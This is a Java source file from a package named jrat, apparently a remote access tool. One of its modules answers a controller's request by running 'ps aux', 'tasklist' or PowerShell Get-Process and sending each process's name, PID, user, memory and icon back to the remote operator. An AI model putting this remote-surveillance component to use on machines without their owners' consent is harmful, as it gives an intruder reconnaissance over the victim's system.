package jrat.module.process;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;
import jrat.common.ProcessData;
import jrat.common.utils.DataUnits;
import oslib.OperatingSystem;
import oslib.windows.WindowsOperatingSystem;
import oslib.windows.WindowsVersion;

import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;


public class Packet19ListProcesses implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		boolean icons = con.readBoolean();
		
		try {
			Process p = run();
			
			if (p != null) {
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				if (OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
					reader.readLine();					
				}
				
				if (usePowerShell()) {
					reader.readLine();
					reader.readLine();	
					reader.readLine();			
				}
				
				String line;

				while ((line = reader.readLine()) != null) {		
					if (line.length() > 0) {
						con.addToSendQueue(new Packet25Process(parse(line, icons)));
					}
				}
				reader.close();
			}
		} catch (Exception err) {
			err.printStackTrace();
		}
	}
	
	/**
	 * Executes and returns the process to read the data from
	 * @return
	 */
	public static final Process run() throws Exception {
		Process p;
				
		if (OperatingSystem.getOperatingSystem().isUnix()) {
			p = Runtime.getRuntime().exec("ps aux");
		} else {
			if (usePowerShell()) {
				p = Runtime.getRuntime().exec(new String[] { "powershell", "Get-Process * | Format-Table -Property name,id,privatememorysize64,path -AutoSize" });
			} else {
				p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
			}
		}
		
		return p;
	}
	
	/**
	 * Parses input data and gets only the wanted information
	 * @param line
	 * @return array to be sent back to controller
	 */
	public static final ProcessData parse(String line, boolean icon) {
		String[] data = new String[4];
		BufferedImage image = null;
		
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			if (usePowerShell()) {
				line = line.replaceAll("( )+", " ");
				String[] sline = line.split(" ");

				data[0] = sline[0];
				data[1] = sline[1];
				
				try {
					data[3] = DataUnits.getAsString(Long.parseLong(sline[2]));
				} catch (NumberFormatException e1) {
					e1.printStackTrace();
				}

				if (icon && sline.length >= 4) {
					String path = "";
					
					for (int i = 3; i < sline.length; i++) {
						path += sline[i] + " ";
					}

					try {
						image = (BufferedImage) ((ImageIcon) FileSystemView.getFileSystemView().getSystemIcon(new File(path))).getImage();
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			} else {
				line = line.replace("\"", "").replace("�", "");
				String[] sline = line.split(",");

				data[0] = sline[0]; // name
				data[1] = sline[1]; // pid
				data[2] = sline[2]; // type / user
				data[3] = sline[4]; // memory usage
				
				data[3] = DataUnits.getAsString(Long.parseLong(sline[3].split(" ")[0]) * 1000);
			}
		} else {
			line = line.trim().replaceAll("( )+", " ");
			String[] args = line.split(" ");

			String name = "";

			for (int i = 10; i < args.length; i++) {
			    name += args[i] + " ";
            }

			data[0] = name;
			data[1] = args[2];
			data[2] = args[0];
			data[3] = args[3];
		}

		for (int i = 0; i < data.length; i++) {
			if (data[i] == null) {
				data[i] = "";
			}
		}
		
		return new ProcessData(data, image);
	}
	
	/**
	 * If we should use PowerShell to retrieve the process data
	 * @return true if current machine is running Windows Vista or higher
	 */
	public static final boolean usePowerShell() {
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			WindowsOperatingSystem wos = (WindowsOperatingSystem) OperatingSystem.getOperatingSystem();
			WindowsVersion version = wos.getVersion();
			
			return version == WindowsVersion.WINVISTA || version.isNewer(WindowsVersion.WINVISTA);
		}
		
		return false;
	}

}
